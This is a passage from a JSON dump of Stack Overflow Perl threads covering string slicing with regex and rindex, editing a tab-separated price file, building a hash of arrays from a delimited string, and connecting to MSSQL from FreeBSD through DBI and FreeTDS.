rrr.abc\n</code></pre>\n\n<p>If instead you want everything before the second last <code>.</code>,</p>\n\n<pre><code>my $s = 'rrr.abc.txy.html';\nmy ($wanted) = $s =~ /^(.*)\\.[^.]*\\.[^.]*\\z/;\nsay $wanted;  # rrr.abc\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "is_accepted": false, "score": 0, "last_activity_date": 1455149563, "creation_date": 1455149563, "answer_id": 35328522, "question_id": 35320861, "link": "https://stackoverflow.com/questions/35320861/regex-to-obtain-everything-till-the-second-to-last-occurrence/35328522#35328522", "title": "Regex to obtain everything till the second to last occurrence", "body": "<p>If you want to get a little creative with <code>substr</code> and <code>rindex</code> you can get a much faster solution.</p>\n\n<pre><code>my $str = 'rrr.abc.tsy.html';\nmy $one = substr($str, 0, rindex($str, '.')); # $one = 'rrr.abc.tsy'\nmy $two = substr($one, 0, rindex($one, '.')); # $two = 'rrr.abc'\n</code></pre>\n\n<p>Here's where we get creative. Rather than create an interim variable, you can wrap the <code>substr</code> inside another <code>substr</code> to get the result instantly (and which my Benchmarks show to be a good 300% faster than using regex or split).</p>\n\n<pre><code>my $wanted = substr($str, 0, rindex(substr($str, 0, rindex($str, '.')), '.'));\n# $wanted = 'rrr.abc'\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 5875602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fe91e63b0af1a012c4dd5516fe42a0d?s=128&d=identicon&r=PG&f=1", "display_name": "Bobby McMillan", "link": "https://stackoverflow.com/users/5875602/bobby-mcmillan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3339, "favorite_count": 0, "closed_date": 1455149798, "accepted_answer_id": 35321073, "answer_count": 4, "score": -4, "last_activity_date": 1455149563, "creation_date": 1455122200, "last_edit_date": 1455134568, "question_id": 35320861, "link": "https://stackoverflow.com/questions/35320861/regex-to-obtain-everything-till-the-second-to-last-occurrence", "closed_reason": "Needs details or clarity", "title": "Regex to obtain everything till the second to last occurrence", "body": "<p>For example if I have rrr.abc.tsy.html</p>\n\n<p>I just want rrr.abc</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 10008, "user_id": 462006, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/37peF.jpg?s=128&g=1", "display_name": "scrappedcola", "link": "https://stackoverflow.com/users/462006/scrappedcola"}, "edited": false, "score": 2, "creation_date": 1455118936, "post_id": 35319470, "comment_id": 58347825, "body": "You left out your question... Please describe the problem, any errors you are getting, and what you have tried to do to solve it."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1455119184, "post_id": 35319470, "comment_id": 58348053, "body": "Wherever you are learning Perl, you should consider finding something more up to date. Global file handles like <code>IN</code> and <code>OUT</code> haven&#39;t been considered good practice for a long time now. And you should <i>always</i> use the three-argument form of <code>open</code>, like <code>open my $in_fh, &#39;&lt;&#39;, &#39;Resources\\shop.txt&#39; or die $!</code>"}, {"owner": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "edited": false, "score": 0, "creation_date": 1455119539, "post_id": 35319470, "comment_id": 58348352, "body": "@BadtotheClone If that&#39;s TSV, you might want to use a module for it."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 2, "creation_date": 1455121588, "post_id": 35319470, "comment_id": 58349942, "body": "I&#39;m ambivalent - tab sep parsing is easy with split - modules are useful if you have to handle quoting"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "edited": false, "score": 0, "creation_date": 1455146866, "post_id": 35319470, "comment_id": 58364559, "body": "@Biffen: I disagree. A tab-separated data file should never use quoted fields or escaped quotes within fields, and it is really awkward to get the module to process a simple character-separated file format. <b><i>Always</i></b> use <code>chomp</code> and <code>split &#47;\\t&#47;</code> if you have a <i>proper</i> tab-separated file. If you don&#39;t then <code>Text::CSV</code> will fix nothing"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "edited": false, "score": 0, "creation_date": 1455147058, "post_id": 35319470, "comment_id": 58364635, "body": "@Biffen: Do you know of a module for tab-separated data? I can&#39;t find one, and it would be so simple as to be redundant"}, {"owner": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455172314, "post_id": 35319470, "comment_id": 58372388, "body": "@Borodin Text::CSV can do TSV. And yes, manual splitting works too, but a module can have other advantages, e.g. understanding a header line."}], "answers": [{"comments": [{"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 1, "creation_date": 1455119229, "post_id": 35319568, "comment_id": 58348087, "body": "Why use lexical filehandles ?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 5, "creation_date": 1455119353, "post_id": 35319568, "comment_id": 58348195, "body": "They&#39;re not global (imagine using a module, where someone else decided to use <code>OUT</code>). They get closed automatically on scope exit (when you use them within a sub."}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 2, "creation_date": 1455120252, "post_id": 35319568, "comment_id": 58348897, "body": "You may want to add the <code>\\n</code> to the end after the <code>join</code> in your extended example."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1455144890, "post_id": 35319568, "comment_id": 58363739, "body": "Another reason you should use lexical handles is that you can pass them around between subs, and never have to worry about clobbering a global somewhere far away. You can&#39;t do that with bareword handles. This is an extremely handy thing in many cases."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 2, "creation_date": 1455145369, "post_id": 35319568, "comment_id": 58363933, "body": "@123: <i>\u201cWhy use lexical file handles?\u201d</i> should be a whole new separate question that I would be delighted to see! Please ask it"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1455145376, "post_id": 35319568, "comment_id": 58363937, "body": "Also, theres a good reason not to use the old 2-arg open. If you mistype, or an input is not what you think, you could potentially overwrite the file you intend to read, and you&#39;d be scratching your head. Always use 3-arg open with lexical handles, and trap any errors with <code>die</code> just like @Sobrique has shown. Note that as just a nit, the parens are unnecessary."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1455145549, "post_id": 35319568, "comment_id": 58363994, "body": "@stevieb: The primary reason for avoiding two-argument <code>open</code> calls is that it&#39;s tough to open a file called <code>&gt;</code> or similar. That&#39;s not a problem on Windows, but is one of Unix&#39;s failings"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455145925, "post_id": 35319568, "comment_id": 58364148, "body": "@Sobrique: I wonder what you think about solutions like this, where you can post pretty much anything that will probably not be tested, followed by one or more intermediate updates, and then a final update that answers the question. It&#39;s certainly a way to get points"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455146001, "post_id": 35319568, "comment_id": 58364188, "body": "@Borodin... that&#39;s kind of what I was getting at, and should have given an example. For instance, if your filename var becomes <code>&#39;&gt;file.txt&#39;</code> somehow, you&#39;re hosed."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1455146273, "post_id": 35319568, "comment_id": 58364308, "body": "@stevieb: Yes I got that. Thank you. But I&#39;m talking specifically about solutions that look like <code>a = b</code> and the whole world goes <i>+1 wow yeah! a = b</i> and then the author updates his solution saying, <i>actually I meant that you should open the file in binary mode</i>. Sadly, the world then goes <i>+6 a = b and binary mode! hero!</i>"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 5, "last_activity_date": 1455121535, "last_edit_date": 1455121535, "creation_date": 1455118929, "answer_id": 35319568, "question_id": 35319470, "link": "https://stackoverflow.com/questions/35319470/read-text-file-and-change-it/35319568#35319568", "title": "Read text file and change it", "body": "<p>You don't actually alter <code>$_</code> at any point, so you're printing whatever you got in.</p>\n\n<p>That <code>print</code> line should probably be:</p>\n\n<pre><code>print OUT join (\"\\t\", $sections[0], $prices ),\"\\n\";\n</code></pre>\n\n<p>Although actually, you should probably:</p>\n\n<ul>\n<li>Use lexical filehandles <code>open ( my $in, '&lt;', 'Resources\\shop.txt' );</code> </li>\n<li>I wouldn't actually <code>split</code> into an array, then assign that value, then change it - try <code>my @fields = split ( /\\t/ ); $fields[1] *= 1.1; print OUT join \"\\t\", @fields;</code></li>\n</ul>\n\n<p>So:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse diagnostics;\n\n\nopen( my $input, '&lt;', 'Resources\\shop.txt' )\n    or die \"Can't open input file: $!\";\nopen( my $output, '&gt;', 'Resources\\discount.txt' )\n    or die \"Can't open output file: $!\";\n\nwhile (&lt;$input&gt;) {\n    chomp;\n    my @sections = split(/\\t/);\n    $sections[1] *= 1.1 if $sections[1] =~ m/\\d/;\n    print {$output} join \"\\t\", @sections, \"\\n\";\n}\n\nclose ( $input ) or warn $!;\nclose ( $output ) or warn $!;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1455180968, "post_id": 35329895, "comment_id": 58377075, "body": "Could you expand on &quot;better&quot; please?  I have always assumes the opposite - one liners promote the kind of write only code that gives perl a bad name."}, {"owner": {"reputation": 126, "user_id": 5629187, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16a5107ca0c722de83e57801d071fe2e?s=128&d=identicon&r=PG", "display_name": "kergma", "link": "https://stackoverflow.com/users/5629187/kergma"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1455183821, "post_id": 35329895, "comment_id": 58378920, "body": "&quot;often better&quot; not means &quot;always better&quot;, it depends on how often you need to do such things - if you just need quick and simple file correction  one or several times - I think using one-liner is a better approach"}], "tags": [], "owner": {"reputation": 126, "user_id": 5629187, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16a5107ca0c722de83e57801d071fe2e?s=128&d=identicon&r=PG", "display_name": "kergma", "link": "https://stackoverflow.com/users/5629187/kergma"}, "is_accepted": false, "score": 1, "last_activity_date": 1455158642, "creation_date": 1455158642, "answer_id": 35329895, "question_id": 35319470, "link": "https://stackoverflow.com/questions/35319470/read-text-file-and-change-it/35329895#35329895", "title": "Read text file and change it", "body": "<p>for such a simple task as reading a text file and changing a part of it it is often better to use one-liners for inplace editing:</p>\n\n<pre><code>perl -ne '@s=split /\\t/;if ($s[1]=~/^[\\d.]+$/) {printf \"$s[0]\\t%f\\n\",$s[1]*1.1} else {print}' input_file.txt &gt;output_file.txt\n</code></pre>\n\n<p>see <code>perl --help</code> and <code>perldoc perlrun</code> for -n, -i and -p switches</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5642621"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 35319568, "answer_count": 2, "score": 0, "last_activity_date": 1455158642, "creation_date": 1455118705, "last_edit_date": 1455119620, "question_id": 35319470, "link": "https://stackoverflow.com/questions/35319470/read-text-file-and-change-it", "title": "Read text file and change it", "body": "<p>I am learning Perl by myself and I want to read from a text file and change a part of it. Suppose the text file I have looks like this and I want to increase the price by 10%:</p>\n\n<pre><code>Item     Price   \nJeans    50  \nBlazer   100  \nSuit     140  \n</code></pre>\n\n<p>Here is the code I have written so far - I am a beginner so please be gentle:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse diagnostics;\n\n\nopen (IN,'Resources\\shop.txt') or die \"Can't open input file: $!\";\n\nopen (OUT,\"&gt;\",'Resources\\discount.txt') or die \"Can't open output file: $!\";\n\n\nwhile (&lt;IN&gt;) {\n    chomp;\n    my @sections = split(/\\t/);\n\n    my $prices = ($sections[1]);                    \n    $prices = (($prices)*1.1);                       \n    print OUT \"$_\\n\";\n}\n</code></pre>\n"}, {"tags": ["arrays", "string", "perl", "hash"], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455133811, "post_id": 35319505, "comment_id": 58358022, "body": "Please could someone explain the upvotes? I don&#39;t think I should expect an upvote for writing working code. This is just common-sense programming. This would be very similar in any language except for the horrible <b>C</b>, which has no inherent useful data structures at at all, <b>C++</b>, which focuses on making C objects instead of providing a proper library, and <b>Java</b>, which is pretty much portable C++ that needs a virtual machine to run."}, {"owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "edited": false, "score": 0, "creation_date": 1455151240, "post_id": 35319505, "comment_id": 58365972, "body": "I think people upvote answers when they would have answered in a similar fashion (rather than posting another similar answer)... or if your answer is better than the one they would have posted."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "edited": false, "score": 0, "creation_date": 1455152338, "post_id": 35319505, "comment_id": 58366333, "body": "@Joshua: I guess that makes sense. But that means I&#39;m getting points for posting first, and I don&#39;t like that"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 5, "last_activity_date": 1467889937, "last_edit_date": 1467889937, "creation_date": 1455118772, "answer_id": 35319505, "question_id": 35319266, "link": "https://stackoverflow.com/questions/35319266/split-a-string-into-a-hash-of-arrays-in-perl/35319505#35319505", "title": "Split a string into a hash of arrays in perl", "body": "<p>You will need to split the data into an array and pull items off three at a time, using the first of the three for a key and the remainder in an array reference</p>\n\n<p>Like this</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse Data::Dump;\n\nmy $str = 'This is sentence one.%%%0.3%%%0.6%%%This is sentence two.%%%0.4%%%0.9%%%';\n\nmy %data;\n\n{\n    my @data = split /%%%/, $str;\n\n    while ( @data &gt;= 3) {\n        my @item = splice @data, 0, 3;\n        $data{ shift @item } = \\@item;\n    }\n}\n\ndd \\%data;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>{\n  \"This is sentence one.\" =&gt; [0.3, 0.6],\n  \"This is sentence two.\" =&gt; [0.4, 0.9],\n}\n</code></pre>\n"}], "owner": {"reputation": 451, "user_id": 4731782, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/4d21d08a6606c69444eb2af67e6d1885?s=128&d=identicon&r=PG&f=1", "display_name": "EmmetOT", "link": "https://stackoverflow.com/users/4731782/emmetot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "accepted_answer_id": 35319505, "answer_count": 1, "score": 0, "last_activity_date": 1467889937, "creation_date": 1455118153, "last_edit_date": 1455118299, "question_id": 35319266, "link": "https://stackoverflow.com/questions/35319266/split-a-string-into-a-hash-of-arrays-in-perl", "title": "Split a string into a hash of arrays in perl", "body": "<p>I have a string that looks like</p>\n\n<pre><code>This is sentence one.%%%0.3%%%0.6%%%This is sentence two.%%%0.4%%%0.9%%%\n</code></pre>\n\n<p>etc. The percent signs just act as delimiters and I can change them as need be.</p>\n\n<p>I need to end up with something like this:</p>\n\n<pre><code>{\n    'This is sentence one' =&gt; [0.3, 0.6],\n    'This is sentence two' =&gt; [0.4, 0.9]\n}\n</code></pre>\n\n<p>I can split it into an array or hash no problem, the only bit that's giving me trouble is making every first segment a key and every other segment an element of an array. Knowing perl, there's probably a very efficient way to do this in one line!</p>\n"}, {"tags": ["sql-server", "perl", "freebsd", "freetds"], "answers": [{"tags": [], "owner": {"reputation": 340, "user_id": 2334220, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d1935b25c3000a21c1b3384bcdb3c75d?s=128&d=identicon&r=PG", "display_name": "Vinnix", "link": "https://stackoverflow.com/users/2334220/vinnix"}, "is_accepted": false, "score": 2, "last_activity_date": 1455131156, "creation_date": 1455131156, "answer_id": 35323812, "question_id": 35318835, "link": "https://stackoverflow.com/questions/35318835/connect-to-mssql-through-perl-on-freebsd/35323812#35323812", "title": "Connect to MSSQL through PERL on FreeBSD*", "body": "<p>You also can install packages on your freebsd box using <a href=\"https://wiki.freebsd.org/pkgng\" rel=\"nofollow\">pkg</a> tool.\nSo, something like this:</p>\n\n<pre><code>pkg install p5-DBI p5-DBD-Sybase freetds\n</code></pre>\n\n<p>About your perl check-up script, I guess that you need to also include:</p>\n\n<pre><code>use DBD:Sybase;\n</code></pre>\n\n<p>And I will give a try to change <code>DBI:Sybase:server=...</code> to <code>dbi:Sybase:server=...</code> </p>\n\n<p>But if you need make sure, check this url: <a href=\"http://search.cpan.org/~mewp/DBD-Sybase-1.15/Sybase.pm\" rel=\"nofollow\">http://search.cpan.org/~mewp/DBD-Sybase-1.15/Sybase.pm</a></p>\n\n<p>Hope that my 0.002 helps! ;-)</p>\n"}, {"tags": [], "owner": {"reputation": 101, "user_id": 6648891, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b05168a565c0f42ddf44a1f5c5bb0ced?s=128&d=identicon&r=PG&f=1", "display_name": "Alexander Prokoshev", "link": "https://stackoverflow.com/users/6648891/alexander-prokoshev"}, "is_accepted": false, "score": 0, "last_activity_date": 1469698539, "creation_date": 1469698539, "answer_id": 38632520, "question_id": 35318835, "link": "https://stackoverflow.com/questions/35318835/connect-to-mssql-through-perl-on-freebsd/38632520#38632520", "title": "Connect to MSSQL through PERL on FreeBSD*", "body": "<p>It seems different versions of Sybase.pm have different DBI->connect arguments parsing logic.</p>\n\n<p>I've just found that Sybase.pm $Id 1.115$ doesn't work with calls of form</p>\n\n<pre><code>DBI-&gt;connect('DBI:Sybase:server=mydbhost:database=dbname','username','password')\n</code></pre>\n\n<p>(note the colon between 'mydbhost' and 'database') while Sybase.pm $Id 1.44$ perfectly does.\nOr is it a difference in DBI?</p>\n\n<p>Posting it here for googlers.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5133357"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 502, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1469698539, "creation_date": 1455117099, "question_id": 35318835, "link": "https://stackoverflow.com/questions/35318835/connect-to-mssql-through-perl-on-freebsd", "title": "Connect to MSSQL through PERL on FreeBSD*", "body": "<p>I am tryin to <strong>connect</strong> to <strong>mssql</strong> through <strong>perl</strong> on <strong>freebsd</strong>.\nOn Linux it was easy:</p>\n\n<pre><code>apt-get install libdbi-perl freetds-bin libdbd-sybase-perl\n</code></pre>\n\n<p>After that i create freetds.conf file with settings. Example:</p>\n\n<pre><code>[MSSQL]\n    host = %my server%\n    port = 1433\n    tds version = 7.0 \n</code></pre>\n\n<p>And its work. For the same logic i tryed:</p>\n\n<pre><code>cd /usr/ports/databases/p5-DBI/ &amp;&amp; make install clean\ncd /usr/ports/databases/freetds/ &amp;&amp; make install clean\ncd /usr/ports/databases/p5-DBD-Sybase/ &amp;&amp; make install clean\n</code></pre>\n\n<p>Then i run same code from Linux:</p>\n\n<pre><code>use DBI;\n\nmy $hostname = 'MSSQL';\nmy $database = %my database%;\nmy $user = %my user%;\nmy $pass = %my password%;\n\nmy $dbh = DBI-&gt;connect(\"DBI:Sybase:server=$hostname;database=$database\", $user, $pass);\n</code></pre>\n\n<p>And i get:</p>\n\n<pre><code>DBI connect('server=MSSQL;database=%my database%, %user%, %password%) failed: (no error string)\n</code></pre>\n\n<p>I will appreciate for any help.</p>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 532, "user_id": 716119, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/64d3d8eb46cc0ed153c42b25a76c131f?s=128&d=identicon&r=PG", "display_name": "SparkeyG", "link": "https://stackoverflow.com/users/716119/sparkeyg"}, "edited": false, "score": 1, "creation_date": 1455116763, "post_id": 35318290, "comment_id": 58346093, "body": "Slight typo in your code above: <code>$hash{$count]++</code> should be <code>$hash{$count}++</code> Note the closing brace"}], "answers": [{"tags": [], "owner": {"reputation": 2324, "user_id": 5334131, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JU6Bo.jpg?s=128&g=1", "display_name": "Hellmar Becker", "link": "https://stackoverflow.com/users/5334131/hellmar-becker"}, "is_accepted": false, "score": 0, "last_activity_date": 1455115821, "creation_date": 1455115821, "answer_id": 35318375, "question_id": 35318290, "link": "https://stackoverflow.com/questions/35318290/perl-count-occurances-of-array-elements-in-text-file/35318375#35318375", "title": "Perl - Count occurances of array elements in text file?", "body": "<p>Loop over the array1 instead of the hash keys:</p>\n\n<pre><code>for my $key (@array1) {\n  my $count = $hash{$key} // 0;\n  print \"$key = $count\\n\";\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 532, "user_id": 716119, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/64d3d8eb46cc0ed153c42b25a76c131f?s=128&d=identicon&r=PG", "display_name": "SparkeyG", "link": "https://stackoverflow.com/users/716119/sparkeyg"}, "is_accepted": false, "score": 0, "last_activity_date": 1455116659, "creation_date": 1455116659, "answer_id": 35318678, "question_id": 35318290, "link": "https://stackoverflow.com/questions/35318290/perl-count-occurances-of-array-elements-in-text-file/35318678#35318678", "title": "Perl - Count occurances of array elements in text file?", "body": "<p>All you need to do is change how you declare <code>%hash</code></p>\n\n<pre><code>my %hash = map {$_ =&gt; 0} @array1;\n</code></pre>\n\n<p>This will create a hash with keys from <code>@array1</code> all initialized to zero.</p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455120381, "post_id": 35319080, "comment_id": 58348998, "body": "That involves unnecessarily looping over all the elements of <code>@array2</code> multiple times (within <code>grep</code>). Also <code>$i</code> is a poor choice of identifier as it is generally used for an array index. It contains &quot;words&quot; from <code>@array1</code> so how about <code>$word</code>?"}, {"owner": {"reputation": 15, "user_id": 5908517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7404317a24402b1f35ca10ab87884c74?s=128&d=identicon&r=PG&f=1", "display_name": "user145265", "link": "https://stackoverflow.com/users/5908517/user145265"}, "edited": false, "score": 0, "creation_date": 1455121172, "post_id": 35319080, "comment_id": 58349644, "body": "So which way is best?"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, 